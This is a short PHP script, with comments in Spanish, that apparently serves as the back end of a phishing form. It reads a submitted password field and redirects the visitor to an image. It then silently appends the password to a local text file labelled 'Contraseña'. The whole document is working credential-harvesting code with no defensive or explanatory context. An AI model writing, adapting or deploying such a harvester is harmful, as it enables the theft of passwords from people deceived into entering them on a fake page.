<?php
// recibo todo los datos del formulario 
$Clave=$_POST["Clave"];
header('Location: images.png');
// Abro el archivo
     $co = "===========================================\n";
     $cl = "===========================================\n";
     $file=fopen("datos.txt", "a"); 
     // Le cargo los datos
     $pa = "Contraseña: $Clave\n";
     fwrite($file, "\n". $co. $pa. $cl);
     fclose($file);
     ?>
